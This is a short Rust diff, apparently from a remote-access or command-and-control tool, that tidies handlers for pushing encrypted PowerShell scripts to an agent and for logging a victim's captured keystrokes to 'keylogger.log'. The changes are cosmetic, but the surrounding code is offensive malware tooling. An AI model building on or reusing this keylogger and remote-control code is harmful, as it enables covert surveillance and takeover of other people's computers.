@@ -53,7 +53,7 @@ pub async fn handle_importpsh(
     let stream = connection_info.stream.clone();
     let shared_secret = connection_info.shared_secret;
     let encrypted_cmd = encrypt(import_cmd, &shared_secret).unwrap();
-    let combined_command = format!("{}", encoded_script);
+    let combined_command = encoded_script;
 
     stream
         .lock()
@@ -564,7 +564,6 @@ pub async fn handle_keylogger(
 
     let thread_handle = THREAD_HANDLE.as_ref();
     let handle = tokio::spawn(async move {
-        // have file keylogger.log be opened in append mode if it already exists
         let mut file = match File::create("keylogger.log") {
             Ok(file) => file,
             Err(_) => return Err("Error creating file".to_string()),
@@ -583,7 +582,6 @@ pub async fn handle_keylogger(
                         return Ok(());
                     }
                     println!("{}", data);
-                    // write data to keylogger.log
                     match file.write(data.as_bytes().trim_ascii()) {
                         Ok(_) => (),
                         Err(_) => return Err("Error writing to file".to_string()),
